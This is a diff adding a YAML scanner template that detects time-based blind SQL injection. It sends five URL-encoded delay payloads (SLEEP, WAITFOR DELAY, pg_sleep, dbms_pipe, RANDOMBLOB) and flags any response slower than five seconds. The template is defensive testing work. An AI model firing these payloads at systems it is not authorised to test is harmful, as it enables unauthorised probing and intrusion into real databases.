@@ -1,0 +1,24 @@
+id: whai-sqli-blind-time
+
+info:
+  name: Time-Based Blind SQL Injection
+  author: whitehat-ai
+  severity: critical
+  description: Detects blind SQL injection via time delays across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite
+  tags: sqli,blind,time-based,critical
+  reference:
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1%27%20AND%20SLEEP(5)--%20-"
+      - "{{BaseURL}}/?id=1%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20-"
+      - "{{BaseURL}}/?id=1%27%20AND%20pg_sleep(5)--%20-"
+      - "{{BaseURL}}/?id=1%27%20AND%201%3Ddbms_pipe.receive_message(%27a%27,5)--%20-"
+      - "{{BaseURL}}/?id=1%20AND%20(SELECT%20LIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2)))))%20--%20-"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
